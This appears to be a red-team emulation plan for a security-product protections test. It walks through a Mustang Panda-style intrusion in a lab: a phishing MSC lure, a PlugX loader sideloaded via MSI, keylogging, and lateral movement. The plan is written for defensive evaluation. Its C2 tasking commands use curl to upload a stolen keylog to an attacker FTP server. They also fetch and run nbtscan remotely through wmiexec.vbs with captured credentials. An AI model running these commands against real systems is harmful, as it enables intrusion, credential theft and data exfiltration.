# Protections Test 5 Scenario


[2]:https://web.archive.org/web/20250102192805/https://blogs.blackberry.com/en/2022/12/mustang-panda-uses-the-russian-ukrainian-war-to-attack-europe-and-asia-pacific-targets
[3]:https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
[7]:https://blog.eclecticiq.com/mustang-panda-apt-group-uses-european-commission-themed-lure-to-deliver-plugx-malware
[8]:https://www.welivesecurity.com/2022/03/23/mustang-panda-hodur-old-tricks-new-korplug-variant/
[9]:https://www.welivesecurity.com/2023/03/02/mqsttang-mustang-panda-latest-backdoor-treads-new-ground-qt-mqtt/
[12]:https://lab52.io/blog/mustang-pandas-plugx-new-variant-targetting-taiwanese-government-and-diplomats/
[13]:https://www.proofpoint.com/us/blog/threat-insight/good-bad-and-web-bug-ta416-increases-operational-tempo-against-european
[14]:https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0109.pdf
[15]:https://www.secureworks.com/blog/bronze-president-targets-government-officials
[17]:https://www.trendmicro.com/en_us/research/24/b/earth-preta-campaign-targets-asia-doplugs.html
[23]:https://www.trendmicro.com/en_us/research/24/i/earth-preta-new-malware-and-strategies.html
[25]:https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/
[26]:https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/

## Setup

### Procedures

- ☣️ Initiate an RDP session to the Kali attack host `driftmark (174.3.0.70)`

  | Destination | Username | Password         |
    |-------------|----------|----------------|
  | 174.3.0.70  | op1      | `Barbed-Directive` |

- ☣️ In a new terminal window, start the evalsC2server **if it is not already
running**:

  ```bash
  cd /opt/kalidev/mustang_panda/controlServer/
  sudo go build -o controlServer main.go
  sudo ./controlServer -c config/protections.yml
  ```

  - ***Expected Output***

    ```text
    ...
    [SUCCESS] 2024/04/01 10:10:11 Started handler simplefileserver
    [SUCCESS] 2024/04/01 10:10:11 Started handler toneshell
    [SUCCESS] 2024/04/01 10:10:11 Started handler plugx
    [INFO] 2024/04/01 10:10:11 Waiting for connections
    ```

- ☣️ Initiate an RDP session to the jumpbox host `dreadfort (10.26.3.125)`

  | Destination  | Username | Password         |
  |--------------|----------|------------------|
  | 12.78.110.37 | op1      | Barbed-Directive |

- From the jumpbox, initiate an RDP session to the workstation `ironoaks
(10.26.4.104)`

  | Destination       | Username       | Password      |
  |-------------------|----------------|---------------|
  | ironoaks.vale.net | vale\awaynwood | `Wheel-Grand` |

## Step 1 - Execution and Command and Control

### Voice Track

Step 1 assumes Mustang Panda has sent a phishing link that has bypassed email security
measures and reached the user awaynwood. awaynwood opens the malicious link
which initiates the download of the attacker's MSC file
`Calendar_Invitation.msc`.

When awaynwood double-clicks to open the file, they
are presented with what appears to be a PDF to open. Instead, clicking the PDF
executes PowerShell commands to download and execute the attacker's MSI file
`2025erdt.msi`.

The MSI file `2025erdt.msi` drops the legitimate executable
`rc.exe`, the Plug X loader `rcdll.dll`, and the Plug X shellcode
`resinfo.dat`. Then, the MSI file `2025erdt.msi` executes the legitimate
executable `rc.exe`, which DLL sideloads the Plug X loader `rcdll.dll`.

The
Plug X loader decrypts and loads the Plug X shellcode `resinfo.dat` into
memory for execution. On execution, Plug X will drop and display the decoy PDF
`Meeting Invitation.pdf` then establish an HTTPS-based C2 channel to
`MaesterJam2025.com:443`

### Procedures

- On the workstation `ironoaks (10.26.4.104)`, open FireFox and browse to the
malicious link to initiate the download of the `Calendar_Invitation.msc` file

  | Destination
  |  -
  | <http://faithoftheseven.com/files2/Calendar_Invitation.msc>

- Open the Downloads folder, right-click `Calendar_Invitation.msc` > Properties.
At the bottom of the Properties window, check to "Unblock" the file and click
"Ok". Then, double-click to execute `Calendar_Invitation.msc` via `mmc.exe`.
When the MSI window appears with the PDF file, double-click the PDF file.

- ☣️ Switch to Kali and confirm C2 registration of a new Plug X session

### Reference Tables

| Tactic              | Technique ID | Technique Name                                           | Platform | Detection Criteria                                                                                                      | Category                    | Red Team Activity                                                                                                                                                               | Hosts                  | Users     | Source Code Links                                                                                                                                                                                                                        | Relevant CTI Reports            |
|---------------------|--------------|----------------------------------------------------------|----------|-------------------------------------------------------------------------------------------------------------------------|-----------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------|-----------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------|
| Execution           | T1204.001    | User Execution: Malicious Link                           | Windows  | awaynwood clicked http[:]//faithoftheseven[.]com                                                                        | Calibrated - Not Benign     | awaynwood opens the malicious link                                                                                                                                              | ironoaks (10.26.4.104) | awaynwood | -                                                                                                                                                                                                                                        | [9], [14], [17]                 |
| Execution           | T1218.014    | System Binary Proxy Execution: MMC                       | Windows  | awaynwood executed `mmc.exe` to open `Calendar_Invitation.msc`                                                          | Calibrated - Not Benign     | `mmc.exe` opens `Calendar_Invitation.msc`                                                                                                                                       | ironoaks (10.26.4.104) | awaynwood | -                                                                                                                                                                                                                                        | [14]                            |
| Execution           | T1059.001    | Command and Scripting Interpreter: PowerShell            | Windows  | mmc.exe executed PowerShell commands                                                                                    | Calibrated - Not Benign     | `mmc.exe` executes PowerShell commands                                                                                                                                          | ironoaks (10.26.4.104) | awaynwood | -                                                                                                                                                                                                                                        | [14]                            |
| Persistence         | T1218.007    | System Binary Proxy Execution: Msiexec                   | Windows  | PowerShell installs the msi file `2025erdt.msi` from `http://essos-news.com/files2/2025erdt.msi`                        | Calibrated - Not Benign     | PowerShell installs the msi file `2025erdt.msi` from `http://essos-news.com/files2/2025erdt.msi`                                                                                | ironoaks (10.26.4.104) | awaynwood | -                                                                                                                                                                                                                                        | [14]                            |
| Persistence         | T1218.007    | System Binary Proxy Execution: Msiexec                   | Windows  | msiexec.exe created a new folder `C:\Program Files\Sarnor\2025erdt` containing `rc.exe`, `rcdll.dll`, and `resinfo.dat` | Calibrated - Not Benign     | Execution of MSI file `2025erdt.msi` results in commands executed to create a new folder `C:\Program Files\Sarnor\2025erdt` containing `rc.exe`, `rcdll.dll`, and `resinfo.dat` | ironoaks (10.26.4.104) | awaynwood | -                                                                                                                                                                                                                                        | [14]                            |
| Defense Evasion     | T1027.013    | Obfuscated Files or Information: Encrypted/Encoded File  | Windows  | `resinfo.dat` is encrypted using RC4                                                                                    | Calibrated - Not Benign     | Plug X shellcode `resinfo.dat` is encrypted using RC4                                                                                                                           | ironoaks (10.26.4.104) | awaynwood | [rc4_encrypt_file.py](../Resources/plugx/src/shellcode/external_helpers/rc4_encrypt_file.py)                                                                                                                                             | [3], [8], [14]                  |
| Execution           | T1059.003    | Command and Scripting Interpreter: Windows Command Shell | Windows  | msiexec.exe executed rc.exe                                                                                             | Not Calibrated - Not Benign | MSI file `2025erdt.msi` executes `rc.exe`                                                                                                                                       | ironoaks (10.26.4.104) | awaynwood | -                                                                                                                                                                                                                                        | [3], [14]                       |
| Defense Evasion     | T1574.002    | Hijack Execution Flow: DLL Side-Loading                  | Windows  | `rc.exe` sideloads `rcdll.dll`                                                                                          | Calibrated - Not Benign     | Legitimate binary `rc.exe` sideloads Plug X loader `rcdll.dll`                                                                                                                  | ironoaks (10.26.4.104) | awaynwood | [DLL exports](../Resources/plugx/src/test5/rcdll/rcdll.def), [Exported function definitions](../Resources/plugx/src/test5/rcdll/rcdll.cpp#L31-L39)                                                                                       | [3], [7], [12], [14], [15]      |
| Defense Evasion     | T1140        | Deobfuscate/Decode Files or Information                  | Windows  | `rcdll.dll` reads and decrypts `resinfo.dat`                                                                            | Calibrated - Not Benign     | Plug X loader `rcdll.dll` reads and decrypts Plug X shellcode `resinfo.dat`                                                                                                     | ironoaks (10.26.4.104) | awaynwood | [Decrypt shellcode](../Resources/plugx/src/test5/rcdll/stub.cpp#L168-L171), [rc4.cpp](../Resources/plugx/src/common/rc4.cpp)                                                                                                             | [3], [7], [8], [12], [14], [15] |
| Defense Evasion     | T1620        | Reflective Code Loading                                  | Windows  | `rcdll.dll` loads `resinfo.dat` into memory                                                                             | Calibrated - Not Benign     | Plug X loader `rcdll.dll` loads the Plug X shellcode into memory                                                                                                                | ironoaks (10.26.4.104) | awaynwood | [Load shellcode](../Resources/plugx/src/test5/rcdll/stub.cpp#L122-L166)                                                                                                                                                                  | [3], [7], [8], [12], [14]       |
| Defense Evasion     | T1027.007    | Obfuscated Files or Information: Dynamic API Resolution  | Windows  | rc.exe dynamically resolves Windows API calls at runtime using the FNV1A hash.                                          | Calibrated - Not Benign     | Plug X dynamically resolves Windows API calls at runtime using the FNV1A hash.                                                                                                  | ironoaks (10.26.4.104) | awaynwood | [FetchFunctions](../Resources/plugx/src/shellcode/shellcode_util.cpp#L5-L200)                                                                                                                                                            | [8], [13]                       |
| Defense Evasion     | T1036        | Masquerading                                             | Windows  | msedge.exe writes the decoy PDF file `Meeting Invitation.pdf` to %TEMP% then opens it                                   | Not Calibrated - Not Benign | Plug X writes the decoy PDF file `Meeting Invitation.pdf` to %TEMP% then opens it                                                                                               | ironoaks (10.26.4.104) | awaynwood | [HandleDecoyPDF](../Resources/plugx/src/shellcode/modules/DecoyPDF/DecoyPDF.cpp#L69-L173)                                                                                                                                                | [3], [14], [17]                 |
| Command and Control | T1071.001    | Application Layer Protocol: Web Protocols                | Windows  | rc.exe connects to `MaesterJam2025.com` over HTTPS                                                                      | Calibrated - Not Benign     | Plug X connects to `MaesterJam2025.com` over HTTPS                                                                                                                              | ironoaks (10.26.4.104) | awaynwood | [getRequest](../Resources/plugx/src/shellcode/comms.cpp#L63-L185), [readResponse](../Resources/plugx/src/shellcode/comms.cpp#L187-L321), [Set server, port, and HTTPS at build](../Resources/plugx/src/shellcode/CMakeLists.txt#L66-L68) | [7]                             |
| Command and Control | T1573.002    | Encrypted Channel: Asymmetric Cryptography               | Windows  | rc.exe leverages HTTPS for encrypted communication with the C2                                                          | Calibrated - Not Benign     | Plug X leverages HTTPS for encrypted communication with the C2                                                                                                                  | ironoaks (10.26.4.104) | awaynwood | [getRequest](../Resources/plugx/src/shellcode/comms.cpp#L63-L185), [Initialize HTTPS](../Resources/plugx/src/shellcode/comms.cpp#L45-L51), [Set HTTPS at build](../Resources/plugx/src/shellcode/CMakeLists.txt#L68)                     | [2], [7]                        |

## Step 2 - Credential Access

### Voice Track

After establishing C2 communications, Mustang Panda uses the keylogger module in
Plug X to log the destination, username, and password when awaynwood initiates
an RDP session to `heartshome (10.26.3.106)` using their administrator account
`awaynwood.server`. Mustang Panda then tasks Plug X to use `curl.exe` to exfiltrate
the keylog file over FTP.

### Procedures

- ☣️ Task Plug X with starting its keylogger module

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 123 '{"id": "0x1004"}'
  ```

  - ***Expected Output***

    ```text
    Created keylogger thread.
    ```

- Return to the RDP to `ironoaks (10.26.4.104)` and **type slowly** "remote
desktop" into the Search Bar. **Type slowly** the IP address `10.26.3.106`.
Click "Show Options" then type `awaynwood.server` for the username then click
"Connect". **Type slowly** the password `Badge-Chapped` when prompted then click
"Connect".

- After waiting 5 minutes, disconnect from the RDP session to return to the RDP
session to `ironoaks (10.26.4.104)`

- ☣️ Switch to Kali and task Plug X to exfiltrate the keylog file using curl to
the attacker FTP server

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 123 '{"id": "0x1000", "args": "curl.exe -T C:\\Users\\Public\\k.log ftp://ftp_user:Gracious-Coat@49.67.12.21/pp/ --ftp-create-dirs"}'
  ```

### Reference Tables

| Tactic            | Technique ID | Technique Name                                                                        | Platform | Detection Criteria                                                     | Category                | Red Team Activity                                                                         | Hosts                  | Users     | Source Code Links                                                                                           | Relevant CTI Reports |
|-------------------|--------------|---------------------------------------------------------------------------------------|----------|------------------------------------------------------------------------|-------------------------|-------------------------------------------------------------------------------------------|------------------------|-----------|-------------------------------------------------------------------------------------------------------------|----------------------|
| Credential Access | T1056.001    | Input Capture: Keylogging                                                             | Windows  | rc.exe executed its keylogged to capture user input in a k.log file    | Calibrated - Not Benign | Plug X executes its keylogger to capture user input                                       | ironoaks (10.26.4.104) | awaynwood | [Keylogger](../Resources/plugx/src/shellcode/modules/Keylogger/Keylogger.cpp)                               | [17]                 |
| Exfiltration      | T1048.003    | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | Windows  | rc.exe executed curl.exe to exfiltrate the k.log file to `49.67.12.21` | Calibrated - Not Benign | Plug X uses `curl.exe` to exfiltrate the keylog file to attacker FTP server `49.67.12.21` | ironoaks (10.26.4.104) | awaynwood | [HandleExecuteCommand](../Resources/plugx/src/shellcode/modules/ExecuteCommand/ExecuteCommand.cpp#L72-L170) | [23], [25]           |

## Step 3 - Lateral Movement

### Voice Track

With the keylogged destination and credentials, Mustang Panda moves laterally to
`heartshome (10.26.3.106)` using wmiexec.vbs. Mustang Panda executes commands remotely
on the file server to download and execute `nbtscan.exe` against the network,
discovering additional hosts in the network

### Procedures

- ☣️ Check the contents of the keylog file to confirm the RDP destination,
username, and password `Badge-Chapped` were keylogged successfully

  ```bash
  cat /srv/ftp/pp/k.log
  ```

- ☣️ Task Plug X with downloading `wmiexec.vbs` to `C:\Windows\Temp\`

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 123 '{"id": "0x1003", "args": "C:\\Windows\\Temp\\wmiexec.vbs", "file": "wmiexec.vbs"}'
  ```

  - ***Expected Output***

    ```text
    File saved successfully.
    ```

- ☣️ Task Plug X with using `wmiexec.vbs` to download nbtscan to the file server
`heartshome (10.26.3.106)`

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 123 '{"id": "0x1000", "args": "cmd.exe /c \"cscript C:\\Windows\\Temp\\wmiexec.vbs /cmd 10.26.3.106 vale\\awaynwood.server Badge-Chapped \"curl.exe http://essos-news.com/files2/nbtscan.exe -o C:\\users\\awaynwood.server\\AppData\\Roaming\\Acrobat.exe\""}'
  ```

- ☣️ Task Plug X with using `wmiexec.vbs` to execute nbtscan on the file server
`heartshome (10.26.3.106)`

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 123 '{"id": "0x1000", "args": "cmd.exe /c \"cscript C:\\Windows\\Temp\\wmiexec.vbs /cmd 10.26.3.106 vale\\awaynwood.server Badge-Chapped \"C:\\users\\awaynwood.server\\AppData\\Roaming\\Acrobat.exe 10.26.3.0/24\""}'
  ```

  - ***Expected Output***

    ```text
    10.26.3.100     VALE\EYRIE                      SHARING DC
    10.26.3.101     VALE\BLACKTYDE                  SHARING
    10.26.3.102     VALE\GODSWOOD                   SHARING
    10.26.3.105     VALE\REDFORT                    SHARING
    10.26.3.125     WORKGROUP\DREADFORT             SHARING
    ```

### Reference Tables

| Tactic              | Technique ID | Technique Name                            | Platform | Detection Criteria                                                 | Category                    | Red Team Activity                                                  | Hosts                                                                                                                 | Users                       | Source Code Links                                                                                           | Relevant CTI Reports |
|---------------------|--------------|-------------------------------------------|----------|--------------------------------------------------------------------|-----------------------------|--------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|-----------------------------|-------------------------------------------------------------------------------------------------------------|----------------------|
| Command and Control | T1105        | Ingress Tool Transfer                     | Windows  | rc.exe downloaded `wmiexec.vbs` to `C:\Windows\Temp`               | Calibrated - Not Benign     | Plug X downloads `wmiexec.vbs` to `C:\Windows\Temp`                | ironoaks (10.26.4.104)                                                                                                | awaynwood                   | [HandleC2DownloadFile](../Resources/plugx/src/shellcode/modules/C2DownloadFile/C2DownloadFile.cpp#L36-L108) | [15]                 |
| Lateral Movement    | T1021.002    | Remote Services: SMB/Windows Admin Shares | Windows  | wmiexec.vbs creates a network share on `heartshome (10.26.3.106)`  | Calibrated - Not Benign     | wmiexec.vbs creates a network share on `heartshome (10.26.3.106)`  | ironoaks (10.26.4.104), heartshome (10.26.3.106)                                                                      | awaynwood, awaynwood.server | -                                                                                                           | [15]                 |
| Execution           | T1047        | Windows Management Instrumentation        | Windows  | wmiexec.vbs executes commands on `heartshome (10.26.3.106)`        | Calibrated - Not Benign     | wmiexec.vbs executes commands on `heartshome (10.26.3.106)`        | ironoaks (10.26.4.104), heartshome (10.26.3.106)                                                                      | awaynwood, awaynwood.server | -                                                                                                           | [15], [26]           |
| Command and Control | T1105        | Ingress Tool Transfer                     | Windows  | `cmd.exe` executes `curl.exe` to download NBTscan as `Acrobat.exe` | Calibrated - Not Benign     | `cmd.exe` executes `curl.exe` to download NBTscan as `Acrobat.exe` | heartshome (10.26.3.106)                                                                                              | awaynwood.server            | -                                                                                                           | -                    |
| Lateral Movement    | T1021.002    | Remote Services: SMB/Windows Admin Shares | Windows  | wmiexec.vbs creates a network share on `heartshome (10.26.3.106)`  | Not Calibrated - Not Benign | wmiexec.vbs creates a network share on `heartshome (10.26.3.106)`  | ironoaks (10.26.4.104), heartshome (10.26.3.106)                                                                      | awaynwood, awaynwood.server | -                                                                                                           | [15]                 |
| Execution           | T1047        | Windows Management Instrumentation        | Windows  | wmiexec.vbs executes commands on `heartshome (10.26.3.106)`        | Not Calibrated - Not Benign | wmiexec.vbs executes commands on `heartshome (10.26.3.106)`        | ironoaks (10.26.4.104), heartshome (10.26.3.106)                                                                      | awaynwood, awaynwood.server | -                                                                                                           | [15], [26]           |
| Discovery           | T1018        | Remote System Discovery                   | Windows  | `Acrobat.exe` discovers hosts in the network                       | Calibrated - Not Benign     | NBTScan (`Acrobat.exe`) discovers hosts in the network             | heartshome (10.26.3.106), eyrie (10.26.3.100), blacktyde (10.26.3.101), godswood (10.26.3.102), redfort (10.26.3.105) | awaynwood.server            | -                                                                                                           | [15]                 |
| Discovery           | T1046        | Network Service Discovery                 | Windows  | `Acrobat.exe` discovers services running on remote hosts           | Calibrated - Not Benign     | NBTScan (`Acrobat.exe`) discovers services running on remote hosts | heartshome (10.26.3.106), eyrie (10.26.3.100), blacktyde (10.26.3.101), godswood (10.26.3.102), redfort (10.26.3.105) | awaynwood.server            | -                                                                                                           | [15]                 |

## End of Test

### Voice Track

This step includes the shutdown procedures for the end of this Protections Test

### Procedures

- Return to the RDP to `ironoaks (10.26.4.104)`. Close all windows and sign out.
